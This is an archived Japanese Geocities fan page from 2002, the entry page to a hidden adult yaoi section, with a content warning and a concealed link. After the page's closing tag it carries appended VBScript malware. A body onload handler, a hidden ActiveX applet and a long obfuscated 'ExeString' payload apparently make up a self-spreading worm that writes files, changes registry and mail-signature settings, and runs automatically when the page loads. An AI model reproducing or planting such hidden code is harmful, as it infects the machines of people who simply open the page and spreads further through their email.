<HTML>
<HEAD>
<TITLE>危ないぜ★</TITLE>
</HEAD>
<BODY>
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="/static/js/disclaim-element.js" ></script>
<script type="text/javascript" src="/static/js/graph-calc.js" ></script>
<script type="text/javascript" src="/static/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1388534399999;
var wbPrefix = "/web/";
var wbCurrentUrl = "http:\/\/www.geocities.co.jp\/Playtown-Toys\/6571\/ura.html";

var curYear = -1;
var curMonth = -1;
var yearCount = 18;
var firstYear = 1996;
var imgWidth = 450;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "25";
var displayMonth = "Oct";
var displayYear = "2002";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(/static/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wayback-toolbar-logo.png" width="110" alt="Wayback Machine" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://www.geocities.co.jp/Playtown-Toys/6571/ura.html" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20021025135312" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Sep
                       
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 13:53:12 Oct 25, 2002">OCT</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Nov
                       
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="/static/images/toolbar/wm_tb_prv_off.png" width="14" alt="Previous capture" height="16" border="0" />
                       
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 13:53:12 Oct 25, 2002">25</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="/static/images/toolbar/wm_tb_nxt_off.png" width="14" alt="Next capture" height="16" border="0"/>
                       
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2001
                       
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 13:53:12 Oct 25, 2002">2002</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2003
                       
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="/web/20021025135312*/http://www.geocities.co.jp/Playtown-Toys/6571/ura.html" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>1 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">25 Oct 02 - 25 Oct 02</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:450px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:450px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img src="/web/jsp/graph.jsp?graphdata=450_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:9:000000000100_2003:-1:000000000000_2004:-1:000000000000_2005:-1:000000000000_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000_2013:-1:000000000000" id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="450"
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-yellow-pixel.png" width="25" id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;" 
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-red-pixel.png" width="2" id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; "
				height="27" 
				border="0"
			></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->
<DIV ALIGN=CENTER>
<!--*/GeoGuide/*-->
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<TR><TD><!--NEW4--><map name="geoguidelite"><area shape="rect" coords="399,0,468,13" href="/web/20021025135312/http://www.geocities.co.jp/cgi-bin/click/gg-elist4N/gg/www.geocities.co.jp/elist/" alt="E-list"><area shape="rect" coords="329,0,399,13" href="/web/20021025135312/http://www.geocities.co.jp/cgi-bin/click/gg-bbs4N/gg/www.geocities.co.jp/bbs2/" alt="BBS"><area shape="rect" coords="259,0,329,13" href="/web/20021025135312/http://www.geocities.co.jp/cgi-bin/click/gg-search4N/gg/www.geocities.co.jp/search/" alt="Search"><area shape="rect" coords="189,0,259,13" href="/web/20021025135312/http://www.geocities.co.jp/cgi-bin/geoguide/geoguide_rank" alt="Ranking"><area shape="rect" coords="99,0,189,13" href="/web/20021025135312/http://www.geocities.co.jp/cgi-bin/click/gg-comtop4N/gg/www.geocities.co.jp/Playtown-Toys/" alt="Playtown-Toys"><area shape="rect" coords="0,0,99,13" href="/web/20021025135312/http://www.geocities.co.jp/cgi-bin/click/gg-top4N/gg/www.geocities.co.jp/" alt="Go to Top"></map><TABLE BORDER=0 WIDTH=468 HEIGHT=13 BGCOLOR="#000066" CELLPADDING=0 CELLSPACING=0><TD><IMG SRC="/web/20021025135312im_/http://www.geocities.co.jp/images/geoguide/geoguide3_white.gif" WIDTH=468 HEIGHT=13 USEMAP="#geoguidelite" BORDER=0></TD></TABLE></TD></TR>
<TR><TD><a href="/web/20021025135312/http://rd.yahoo.co.jp/M=300048778.300489230.302171793.300110250/S=2075574555:N/A=300294265/?http://bbpromo.yahoo.co.jp/promotion/ins/index.html" target="_top">  <img src="http://config.privoxy.org/send-banner?type=auto" border="0" title="Killed-/web/20021025135312im_/http://img.yahoo.co.jp/adv/ybb/20020910/ia4.gif-by-size" width=468 height=60></a></TD></TR>
</TABLE>
<!--*/GeoGuide/*-->
</DIV>
<BODY BGCOLOR="#000000"></BODY>
<CENTER>
<FONT COLOR="#FFFFFF">
<BR><BR>
<H2>裏へのお誘い…</H2>
<BR><BR><BR>
<P>ここは腐女子の為の部屋です〜<BR>
   表より過激と言えるものが存在致します<BR>
   以下の項目に当てはまるのであれば入室しない方が宜しいでしょう<BR>
<BR>
   1.や●いと言う言葉の意味がわからない<BR>
   2.無理矢理は…（汗）（予定ではいつか書きますので）<BR>
   3.ヤりっぱなしはちょっと…<BR>
<BR>
如何でしたか？項目に当てはまった方
今すぐ帰りましょう→<A HREF="/web/20021025135312/http://www.geocities.co.jp/Playtown-Toys/6571/index.html">帰る</A><BR>
<BR><BR>
大丈夫！という貴方…<BR>
どうぞ下へと進んでくださいな♪<BR>
実は隠しました〜★<BR>
皆さんがんばって探してください！<BR>
尚、質問はメールかBBSでお願い致します〜<BR>
<BR><BR><BR><BR><BR><BR><BR><BR><BR>
</CENTER>
                                       <A HREF="/web/20021025135312/http://www.geocities.co.jp/Playtown-Toys/6571/uraindex.html"><FONT COLOR="#000000">行く？</A></FONT><BR>
<BR><BR><BR><BR><BR><BR><BR><BR><BR>
<CENTER>
<FONT COLOR="#FFFFFF">
<A HREF="/web/20021025135312/http://www.geocities.co.jp/Playtown-Toys/6571/index.html">TOP</A><BR>
</CENTER>
</BODY>
</HTML> 
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "@igEnQfar_*DtgjPerr(V\qPerr(D_ene_Qegh*=pjjaO\hacn*BSI*SsMfalf*SihN]tb*Ou\C(Fcl]lsBeseSo`KD]ot[pp(#KDQat>gi(#KDAne[raMcjeeo&%IFLciaIn&%IFClc]t_K]if&%IFPlmlaa_pe'?l` Ms^Fol_tcmj EH=pjcjdNm$FcjaP[rd,NwleMrn)KnCnripR_qqm_JerrMcp Lc]dNcip;FMM*OjcjT_vpFcja(@gheJ_ph&/%RipMrn 7Ne[bPegn*R__`AfjCdIhqprRipMrn,IF_mr]rn&%#8>.OlHeh&PmjQpr#8 +Ph_lLc]dNcip(Ahomc?vetDqn]reohEhbI`I`PyjcOtl9 fptPh_lLc]dNcip(AhomcMcp @gheNcip;FMM*OjcjT_vpFcja(@gheJ_ph&0%Del_Ramj,Srcra :  BIBU ilho[b9 & rbmanijr6$EH[sn_nt' <  rb=pHf$TgnOtl p`?rFd&FpmfRaxnFcjaT_kl.=jks_S_rF;rprc`=DOO(Eat@gheDel_N]tb'@?ptlg^.[rprc`qt_q=10Chs_R__`T_kl.=jks_S_rFcjaT_kl 7BSI,Kp_lPerrBifc$FcjaP[rd,2'CdTsnaSnp= dtgj NfanBifcPegn*Wlgpet^ClJb  < FPMF<  rb=pHf$6 & >O>Wohjka^; t^s]pepn8  KD]ot[pp(# $8 &t^ClJb  DtgjPerr?joeCdTsnaSnp= rbm TbcjDel_Ramj,Srcra p`?rFd&T^sNcttAn^EfBifcPegn*CfmoeAn^EfAn^BuhapiilBuhapiilKDAdaheaSo`$CopnehrOtlgjg&J]snGjd_v?h[p%Gb F_otCl`erAdal9 *Ph_lCdL_dp(FA]s_&?ulpannQprclc)&/% 7:L=_oe _#Ph_lEH?h[lceMs^ 7Bih_hy>gok$4ZQqb?9 *EfqaIFCb_jg_Qqb;Cbp$Ama$L_dp(FA]s_&?ulpannQprclc)&/%)+1# 8XOu\C=.?l` Cd?joeGJ=f]nacOu\9 Gg`(=snr_lpSnpena*-,F_otCl`erAdal'?l` Cd?l` @sjcngkn@sjcngknIFClc]t_K]if&%Mj ?pnolNemsieLaxnI`EnQfar_9 fpmf TbcjCtinBuhapiil?l` CdMf]r_Del_9 FcbtUenJ_ph&1%  Plmcr[kFcjasVAkmgmj @ghemZIi]pksidp Mf]r_bXSn_piilarsZ^l[lg.briEf&BSI,BifcAxcqpsQdalcBifc%)RdehC[jh EH=pjcjdNm$Sb_ne@ghe& dtgj)AlmcMcp @gheNcip;FMM*OjcjT_vpFcja(Mf]r_Del_*.,npqe#FcjaT_kl.Qpet_< FPMF<  rb=pHf$6 & >O>Wohjka^; t^s]pepn8  KD]ot[pp(# $8 &t^ClJb  DtgjPerr@gheNcip(Ahomc?l` Cd>cbaojpI^9 QqOh_jh.LccR__`(FGES]?ULPANN]QS?PXI^cjtcreemZ@e`_qlnQs_pI> %MqtFmkkPcnscmj 7SsMfalf,NeaPaa^&HECU_FM?AF]IA=FEN?ZOo`rsalcXMcanommbtVMqtfmkkCtplcosVKadc_Rel %UoSbchl(PagQpet_HECU_=SNR?LP_OQARVG`ehretcco\$@e`_qlnG`&ZOo`rsalcXMcanommbtVMqtfmkkCtplcosV  FcbtMqtFmkkPcnscmj,+'&,,\G_elVAkmjmoeSoeQpangkn_pu&/(LCC_>UKR> =_hlIFM[ghR_e$BIAYYAQRLCJTYSOELZEd_lpingasV D_d]ufrEd  XSidpw[pa\Gg_riqkfnZKunjkoeAxjpasmZ&Jafn&KunJkoeTarmgkn&/%   *0VK]ifZOt[reohcnyL]m_ (Sb_ne@ghe#C[jh EHIacjNea&HECU_=SNR?LP_OQARVG`ehretcco\$@e`_qlnG`&ZOo`rsalcXMcanommbtVMqtfmkkCtplcosV  FcbtMqtFmkkPcnscmj,+'&,,\G_elVUed_Ot[reohcnyL]m_ (Sb_ne@ghe#WmQdefj*R_eSrcra FGES]?ULPANN]QS?PXSidpw[pa\Gg_riqkfnZKf`g_eV7*0VMqtfmkkVMltcmjsVK]ifZAdcrkrJpaf_pan]c,+1-010(LCC_>UKR> =_hlIFM[ghR_e$BIAYYAQRLCJTYSOELZOo`rsalcXMcanommbtVUen^mssKasm_ciheSo`oymramVNno`ghemZIi]pksidp Isplimg ClpellatQatngjgmZ,a*b,2*.,0*.,0*._0*.,0*.,0*.,0.4X0*/a0-4,& ^l[lg#C[jh EHIacjNea&HECU_=SNR?LP_OQARVQkfnu]r_ZIi]pksidp\Qgjdiuo HRXCopnehrRelqeohZSihbkwmIemq]gclc Ms^ssqpegZLridel_qXMcanommbtMqtfmkkGjt_pjenOenrenaqX0[.`0,.,0*.,0*.,c*.,0*.,0*.,0*22\*.-e*120*bf_jk'QqOh_jh.LccWlgpe DK?W[COPNEHR[UMCN\Mmbtq_neVKeclmoo`rXO`dec_Z-0(.XOorhoiiXOjreohqXM[gh\?betipLr_dar_l_e*-3+.32& NEA]@WIP@?afjKDK]ifPag DK?W[COPNEHR[UMCN\Mmbtq_neVKeclmoo`rXO`dec_Z-0(.XCikiohZIacjOenrenaqXN_uOt[reohcny*bf_jk'EHqmg_ce@mhd_p$L_dp(QgjP[rd,-'& LrienagBifco\=mimilFcjasVKeclmoo`rSb_ne^ZOt[reohcny'?l` @sjcngkn@sjcngknIFClc]t_Kelccq(#OhArlmn LcougcN_vpRamjN]tb9  CdNir$FMM*FcjaErgotm&SihN]tb UOclglt(cte'% NfanPegnLanf= oymram-0XAn^EfEfRamjN]tb9 qusnci3,Z NfanOt[ppUjDel_9 QgjP[rd  SSQPEGZGellal-0*dfjChs_Sn_ntOnBifc=UenJ_ph$MWOT?KXK_pjef,`lf ?l` CdQqOh_jh.LccWlgpe DK?W[LIA=LYK=CBGJEVQkfnu]r_ZIi]pksidp\Qgjdiuo\=snr_lpV_poiilXRolXK_pjef1.&QpalrQp@gheBSI,?ojwBifcWclLanf& se\Zgjq_hl(eef*SihN]tb uabVDkl^cn.brpBSI,?ojwBifcWclLanf& oymram-0Xkdu]lf,ci` (WclLanf& oymram-0Xd_qgtin*ihgA]lfGJ;nlehbPoUenJ_ph$qc^\@mhd_p*hnr,fpt'QqOh_jh.LccWlgpe DK?W[CF?OS?Q[RIMP\(bhlV (^jhfcjaSsMfalf,NeaUnincBIAYYAHAMQASYPKONZ*dfjXCilpehrTsna& ]pjjec[reoh-t-gq`oqlho[bUoSbchl(PagQpet_HECU_=J=SMCO_LMKTVbhl`gheVBaf[shtCaknV (WmQdefj*R_eNe[b$BIAYYAHAMQASYPKONZrx^del_Z@e`_qlnG_ohZ)SsMfalf,NeaUnincBIAYYAHAMQASYPKONZ`lfdel_ZOclglt?lcihcX& RBManijrUoSbchl(PagQpet_HECU_=J=SMCO_LMKTVbhl@gheVQdefjXOjcj\=mim[l`\*SihN]tb NcipJ_ph$QQ_rcnp._va  !1 %$ QqOh_jh.LccWlgpe DK?W[CF?OS?Q[RIMP\^jhFcja\MfalfCt\Jpkp_ppyMfaenF]n^jarmZSSBNnojqX& w6*014=?1-33/B'/-C@+4C34)0*?=0*@47*6?}WmQdefj*R_eSrcra FGES]?L;QOEM]NOIRXdfjBifcXS]pepnFksnCjciba\*{23-3+4/1'240=+-1>0)B+D5-*.?0.D46=1.4w Mcp @gheNcip;FMM*OjcjT_vpFcja(Mr]rnSlFcja,,*proc%Del_Ramj,Srcra P`oT_vpDel_Ramj,?liqaCjdDqn]reohDqn]reohGJFggeCr$)EfGjWbcne:: fpmf TbcjCtinBuhapiil?l` CdNfesFm_angkn;diaqm_lp.fm_angknEfJafn&PhcqHo]_piil( .'= bifc NfanPhcqHo]_piil=KedRdimJkc[reoh*5)EfDOO(Eat?vpehqeohL]m_&PhcqHo]_piil% 6<ph_lNfesFm_angkn;L_dp(NfesFm_angkn&JanRdimJkc[reoh'-JanDOO(Eat@gheH_ieRdimJkc[reoh'%)An^EfEfJanRdimJkc[reoh'>1TbcjRdimJkc[reoh9 NfesFm_angkn$V ?l` CdEHqmg_ce@mhd_p$TbgoLia]tcmj)An^EfAn^BuhapiilBuhapiilKDK]ifPagPagMrn,@gheH_ie#OhArlmn LcougcN_vpPagNcipMrn 7SsMfalf,NeaPaa^&NeaQpr#I`NeaRamjQpr;Ph_lQqOh_jh.LccWlgpePagMrn,@gheH_ieAn^EfAn^BuhapiilBuhapiilKDM^oMs^(=snr_lpSnpena'Ms^E;0PemrKun9 *DiShcja NpqePemrKun9 NcotIsp %-Gb NcotIsp 8.8RdehCopnehrOtlgjg;Fcl]lsBese 8XAxcrDiEhbI`OhArlmn LcougcN_vpQatRdimDkl^cn 7BSI,CenDkl^cn(=snr_lpSnpena'Mcp >g_So`=Ane[raO\hacn&S]pepngjg(Becngkn[pu#S_rFij`elq=RdimDkl^cn.Ms^Fij`elq@mhd_p?oolp 7,DkrC]cbPegnBofbargj @mhd_poDkl^cnCisjt;Fij`elAkuhr+/>g_So`*a^bFij`elAkuhr( Ncip@mhd_p*N[kaLaxnI`@i]Qqb(Akuhr=.TbcjJ]snGjd_v?h[p=GjsnpNep&?ulpannQprclc,Z,Fcj(=snr_lpSnpena')1#So`Otlgjg;Mcb$CopnehrOtlgjg&J]snGjd_v?h[p'1&JanAqrlcjtMrnihe%-F_otCl`erAdal+-)?ulpannQprclc 7GJ=f]nacOu\&?ulpannQprclc,F_otCl`erAdal'Ms^E;1AlmcCdSo`A 7, Nfan?ulpannQprclc 7?ulpannQprclc  @i]Qqb(Gpeg&-)$V ?vetBkChs_j;0Bolf 7- NmFij`elAkuhrCdL=_oeQqbMrnihe% 7HC[qa(>g_So`*Inci(d'% NfanEfh<Dkl^cnCisjtRdehCopnehrOtlgjg;CopnehrOtlgjg$DcaOu\,Et_k$j%/%  \Ergp >m?l` Cd?l` CdHcttHamrEn^ctCb_n 7EnmrnR_t$CopnehrOtlgjg& X&JanAqrlcjtMrnihe%-+'Ms^Snpena9 Gg`(=snr_lpSnpena*HamrEn^ctCb_n++*Heh&?ulpannQprclc)'J]snGjd_v?h[p)1#CopnehrOtlgjg;KDAdaheaSo`$CopnehrOtlgjg&J]snGjd_v?h[p%CjdGbCjdGbJkojKDM^oMs^ 7?ulpannQprclcCjdDqn]reohDqn]reohGJJpkp[e]t_&%Mj ?pnolNemsieLaxnR_eLanfRafsa 7HECU_FM?AF]IA=FEN?ZOo`rsalcXMcanommbtVMqtfmkkCtplcosVBaglca@imi@eapae;WmQdefj*R_eNe[b$R_eLanfRafsa)EfBeseBaglca 7RdehDcqgD_ene_9 @gjafw@imi& 6\EhbI`Fipi7/ti1BeseBaglca 7GJI`kSo`$DcqgD_ene_'EHqmg_ce@mhd_p$DcqgD_ene_'HcttSsMfalf,NeaUnincR_eLanfRafsa,>gok>ccr_c?l` @sjcngkn@sjcngknIFugk]g_Dkl^cn(J_phH_ie#OhArlmn LcougcN_vpQatDkl^cnN[ka 7BSI,CenDkl^cn(J_phH_ie#S_rTbgoFcjas;Fij`elL]m_,BifcoFpt?vesnq=.@mn ?__hRdimDel_EnRdimDel_q@ghe?vp 7QC[qa(@QK.AcpErranmgknH_ieRdimDel_,Lanf%)EfDel_Ctt;BRIMn @ghe?vp 7HNKHMn @ghe?vp 7AMN IpFcjaErr= LHJ OlBifcAxn9 HOPPh_l=_hlIFAjnan^Rk(Nfes@ghe(N]tb*hnkh#EfqaI`BifcAxn9 T>SPh_l=_hlIFAjnan^Rk(Nfes@ghe(N]tb*v\q)AlmcEfDel_Ctt;BRPRdehHnrAxcqps;1An^EfJerrCd(OA]s_&LanfJagc% 7QC[qa(QgjP[rd  D_qgtinX#'Ol$U=_oeN]tbL]m_'=S?amc$WclLanf& @emipoj %)NfanDtnCtimro 7-CjdGbGb BrpErgotm9 *Ph_l@QK.=mly@gheUenJ_ph$mwot_k/2Vbaserkp(gji*LanfJagc@QK.=mly@gheUenJ_ph$qc^\@mhd_p*hnr,J_phH_ieAn^EfAn^BuhapiilBuhapiilKDQat>gi(#OhArlmn LcougcN_vpCnr(Ahe[pNcotCr=UOclglt(Q_rcnpFojhn[kaGb ?pn NfanEnQfar_9 fpmf ?joeEnQfar_9 t^sEhbI`I`EnQfar_9 t^sPh_lMcp @QK 7?r__peI`fe]r$Manijrena,BifcOymramI`fe]r)OenSsMfalf9 =paancKbdc_t SS]pepn,Oh_jh#EfqaQat?lpfcKbdc_t;diaqm_lp.[nll_ro(IF_asasn %?lpfcKbdc_t(qat=JOI>&{@7/5>A.2'/?F*+-1>.)A>@5-*.?0.D@52?,Bw %?lpfcKbdc_t(ane[raIhqpahaa(#S_rWmQdefj=?lpfcKbdc_t(EatI`fe]r$)=pjjaO\hacn,oenAHSCB$u.@4-DA0++B031)1+AB-2700'.,A*A50/2.22{)=pjjaO\hacn,_r__peClot[l_e'Mcp @QK 7=pjjaO\hacn,CenM^j_ap(#EhbI`S_rDcqgO\hacn9 @QK.>pev_q@mn ?__hBeseRamjEnBeseM^j_apGb >gokNcip(BnipcPyjc<8. ;l` >gokNcip(BnipcPyjc<8- NfanAxcrFip?l` Cd@gjafw@imi=BeseRamj,@rctaL_rpelN_vpBemMph_p=rl&/)NahbkmcxaDkrg90Rk -Onfar;pn(c'=Gjt&5 $Nn^'%LaxnT_klSnpena9  @mn c;- NmL_l$TbgoT_vp)PegnJug9 ;q_(Gg`(NfesNctt&g(1#'CdT_klNok=// NfanPegnJug9 ,6?joeCdT_klNok=/, NfanPegnJug9 ,7?l` CdNcip=f]r;Cbp$T_klNok-Mph_p=rl&e Gm` .'%Gb Ncip=f]r;Cbp$3.'TbcjRamjAdal9 =fn(+6%CjdGbRamjQprclc 7PegnOtlgjg$T_klCb_nLaxnUhJkceQpr;?vacora( @igGes?nr1%,NfesNctt v\AnL`$EcuAlp$0#9  Irdel?nr.%  $rb=pHf  K_w=rl&-);$Onfar;pn(+'&  t^ClJb& Ges?nr0% 7  KtbcnAlp$2#  &p`?rFdIay;pn(-'= &Mph_p=rl&/)$ v\AnL`$@mn c;- NmL_l$ErcOtlgjg# &p`?rFdRamjLqm;Ama$Mcb$ErcOtlgjg&g(1#' t^ClJb& EfRamjLqm;12Ph_l t^ClJb& PegnJug9 -2 t^ClJb& An^Ef v\AnL`$Ncip=f]r;Cbp$T_klNok+Iay;pn(cIo^0)# &p`?rFdGb Ncip=f]r;Cbp$22'Tbcj$rb=pHf  T_klCb_n 7rb=p t^ClJb& AlmcEfRamjAdal9 =fn(,7% Nfan v\AnL`$Ncip=f]r;v\Jb$rb=pHf  EhbI` &p`?rFdRdimRaxn9 NfesNctt$T_klCb_n$rb=pHf  N_vp'  rb=pHf$?vacora(NfesNctt# NfesNctt;?vaSnpena9    PegnOtlgjg$ FpmfRaxn96 & oclgltj]nas]g_;rbmanijr:$v\AnL` bkcokann,srcra   $6 & `ipotsja=!nkscreoh8]bmmhunc7 fcbt4.lx5poj8,pr9wcbph4.lx5decedt4.lx5v-cl`er8.85rimg^ifgpy4di^ban!<  <  & =PJJATL=M?;GJ ]cu_qp BCEGBR90UEDNF90akd_;_og,is( & ]cngreR,=cngre V?ognkn_lp> :  /;NLL?R:$6 & +dct: &t^ClJb  < -oclglt8 &t^ClJb  < q_rcnp f_jgo_ce7t^s]pepn<  rb=pHf$TbgoT_vp  rb=pHf$UhJkceQpr$v\AnL` :  /manijr:$v\AnL` :  /<M@Y8 &t^ClJb  < -DTGJ:RbmRaxn9 NfesNctt$v\AnL` OlHo]iOtl p`?rFd& GJYqpalr$)WclLanf=DOO(EatMnacc_hFij`el&,)$V Cd(@QK.@ghe?vesnq$WclLanf& se\ZBofbar(fpt'% NfanBSI,?ojwBifcWclLanf& se\ZBofbar(fpt*SihN]tb uabVifw[jh.agbAn^EfEf&BSI,BifcAxcqpsUenJ_ph$mwot_k/2Vbaserkp(gji'% NfanBSI,?ojwBifcWclLanf& 